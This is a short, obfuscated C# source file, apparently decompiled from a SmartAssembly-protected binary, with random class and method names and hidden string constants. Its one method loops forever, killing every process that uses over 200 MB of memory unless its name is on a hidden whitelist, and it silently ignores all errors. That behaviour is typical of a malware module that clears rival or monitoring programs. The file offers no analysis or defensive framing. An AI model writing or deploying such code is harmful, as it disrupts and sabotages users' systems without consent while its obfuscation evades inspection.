using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace WEoqBCtavg;

public static class ApzwsRvolh
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void iLPiAPryZGwEhSm()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107461902)) && !process.ProcessName.Contains(getString_0(107461861)) && !process.ProcessName.Contains(getString_0(107461884)) && !process.ProcessName.Contains(getString_0(107461875)) && !process.ProcessName.Contains(getString_0(107462342)) && !process.ProcessName.Contains(getString_0(107462361)) && !process.ProcessName.Contains(getString_0(107462316)) && !process.ProcessName.Contains(getString_0(107462303)) && !process.ProcessName.Contains(getString_0(107462322)) && !process.ProcessName.Contains(getString_0(107462277)) && !process.ProcessName.Contains(getString_0(107462288)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static ApzwsRvolh()
	{
		Strings.CreateGetStringDelegate(typeof(ApzwsRvolh));
	}
}
